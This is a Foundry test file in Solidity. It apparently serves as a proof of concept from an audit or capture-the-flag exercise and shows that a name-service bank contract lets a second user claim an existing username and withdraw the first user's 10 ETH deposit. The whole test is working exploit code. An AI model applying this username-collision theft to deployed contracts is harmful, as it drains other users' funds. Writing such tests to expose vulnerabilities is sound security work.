// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test, console} from "lib/forge-std/src/Test.sol";
import {NAME_SERVICE_BANK} from "../src/NameServiceBank.sol";

contract NameServiceBankAttack is Test {
    NAME_SERVICE_BANK public bank;
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public {
        bank = new NAME_SERVICE_BANK(); // @note owner is this contract
    }

    // Attack Path:
    // 1. Alice sets a username 
    // 2. Alice deposits 10 ETH
    // 3. bob sets same username as alice with same obfuscationDegree
    // 4. bob withdraws alice's balance

    function testAttack() public {
        vm.deal(alice, 11 ether);
        vm.startPrank(alice);
        uint256[2] memory duration = [block.timestamp + 100, block.timestamp];
        bank.setUsername{value: 1 ether}("DragonLover", 5, duration);
        bank.deposit{value: 10 ether}();
        vm.stopPrank();

        vm.deal(bob, 1 ether);
        vm.startPrank(bob);
        bank.setUsername{value: 1 ether}("DragonLover", 5, duration);
        bank.withdraw(bank.balanceOf(alice));
        vm.stopPrank();

        assertEq(bob.balance, 10 ether);
        assertEq(alice.balance, 0 ether);
    }

    receive() external payable {}
}